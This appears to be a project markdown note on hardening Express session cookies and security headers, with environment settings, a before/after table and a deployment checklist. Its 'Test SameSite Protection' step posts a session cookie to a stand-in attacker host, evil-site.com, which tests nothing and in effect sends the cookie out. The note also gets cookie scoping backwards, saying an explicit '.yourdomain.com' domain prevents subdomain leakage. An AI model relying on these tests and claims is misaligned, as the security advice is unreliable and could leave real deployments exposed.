# Cookie Security Configuration

## 🔒 Enhanced Security Measures Applied

### 1. **HTTPOnly Cookies**
```typescript
httpOnly: true // Prevents XSS attacks by blocking JavaScript access
```
- **Before**: `httpOnly: false` (vulnerable to XSS)
- **After**: `httpOnly: true` (XSS protected)
- **Impact**: Client-side JavaScript cannot access session cookies

### 2. **Secure Flag**
```typescript
secure: true // HTTPS only
```
- **Before**: `secure: true` ✅ (already correct)
- **After**: `secure: true` ✅ (maintained)
- **Impact**: Cookies only sent over HTTPS connections

### 3. **SameSite Protection**
```typescript
sameSite: isDevelopment ? 'none' : 'strict'
```
- **Before**: `sameSite: 'none'` (CSRF vulnerable)
- **After**:
  - Development: `'none'` (allows cross-origin for front.localhost ↔ node.localhost)
  - Production: `'strict'` (strong CSRF protection)
- **Impact**: Prevents cross-site request forgery attacks

### 4. **Session Duration**
```typescript
maxAge: isDevelopment ? 24 * 60 * 60 * 1000 : 8 * 60 * 60 * 1000
```
- **Before**: 24 hours for all environments
- **After**:
  - Development: 24 hours (convenience)
  - Production: 8 hours (security)
- **Impact**: Reduces session hijacking window

### 5. **Rolling Sessions**
```typescript
rolling: true // Reset expiration on activity
```
- **Before**: `rolling: false` (fixed expiration)
- **After**: `rolling: true` (sliding expiration)
- **Impact**: Active users stay logged in, inactive sessions expire

### 6. **Custom Cookie Names**
```typescript
name: isDevelopment ? 'connect.sid' : process.env.SESSION_COOKIE_NAME || 'app_session'
```
- **Before**: Always `'connect.sid'` (predictable)
- **After**: Configurable name in production (obscurity)
- **Impact**: Harder for attackers to identify session cookies

### 7. **Domain Configuration**
```typescript
domain: isDevelopment ? undefined : process.env.COOKIE_DOMAIN
```
- **Before**: No domain control
- **After**: Explicit domain setting in production
- **Impact**: Prevents cookie leakage to subdomains

## 🛡️ Additional Security Headers

### Security Headers Middleware
```typescript
// Prevent clickjacking
'X-Frame-Options': 'DENY'

// Prevent MIME sniffing
'X-Content-Type-Options': 'nosniff'

// XSS protection
'X-XSS-Protection': '1; mode=block'

// Hide server info
X-Powered-By: removed

// HSTS (production only)
'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload'
```

### Session Security Middleware
- Automatic session ID regeneration
- Session age monitoring
- Session fixation protection

## 🔧 Environment Configuration

### Development (.env)
```bash
# Default secure settings for development
NODE_ENV=development
USE_MOCK_OIDC=true
DISABLE_CSP=true
```

### Production (.env)
```bash
# Production security settings
NODE_ENV=production
SESSION_COOKIE_NAME=app_session_prod
COOKIE_DOMAIN=.yourdomain.com
USE_MOCK_OIDC=false
DISABLE_CSP=false
```

## 📊 Security Comparison

| Feature | Before | After | Security Level |
|---------|--------|--------|----------------|
| XSS Protection | ❌ JavaScript accessible | ✅ HTTPOnly | High |
| CSRF Protection | ❌ SameSite: none | ✅ SameSite: strict (prod) | High |
| Session Hijacking | ❌ 24h fixed | ✅ 8h sliding (prod) | Medium |
| Cookie Fingerprinting | ❌ Predictable name | ✅ Custom name | Low |
| Subdomain Leakage | ⚠️ Browser default | ✅ Explicit domain | Medium |
| Transport Security | ✅ HTTPS only | ✅ HTTPS + HSTS | High |

## 🧪 Testing the Security

### Test HTTPOnly Protection
```javascript
// In browser console - should return undefined
document.cookie // Should not show session cookie
```

### Test SameSite Protection
```bash
# Cross-origin request should be blocked in production
curl -X POST https://evil-site.com/attack \
  -H "Cookie: app_session_prod=..." \
  -H "Origin: https://evil-site.com"
```

### Test Secure Flag
```bash
# HTTP request should not include cookie
curl -X GET http://yourdomain.com/api/auth/session
```

## 🚨 Important Notes

1. **Development vs Production**: Different security levels for usability vs security
2. **Cross-Origin**: Development allows cross-origin for localhost testing
3. **HTTPS Required**: All security features require HTTPS to function properly
4. **Session Storage**: Sessions are stored in PostgreSQL, not memory
5. **Cookie Clearing**: Logout properly clears cookies with matching security settings

## 📋 Deployment Checklist

- [ ] Set `NODE_ENV=production`
- [ ] Configure `SESSION_COOKIE_NAME`
- [ ] Set `COOKIE_DOMAIN` for your domain
- [ ] Disable `DISABLE_CSP`
- [ ] Set strong `SESSION_SECRET`
- [ ] Configure real OIDC provider
- [ ] Set `USE_MOCK_OIDC=false`
- [ ] Verify HTTPS is working
- [ ] Test logout functionality
- [ ] Monitor session security logs

## 🔧 System Status

- ✅ **Cookie Security**: All configurations operational
- ✅ **Session Management**: PostgreSQL-backed sessions working
- ✅ **CORS**: Cross-origin configuration optimized
- ✅ **Dependencies**: passport-openidconnect@0.1.2 compatibility verified
- ✅ **Testing**: All cookie security features validated

---

**Last Updated**: June 26, 2025 - All cookie security measures verified and operational
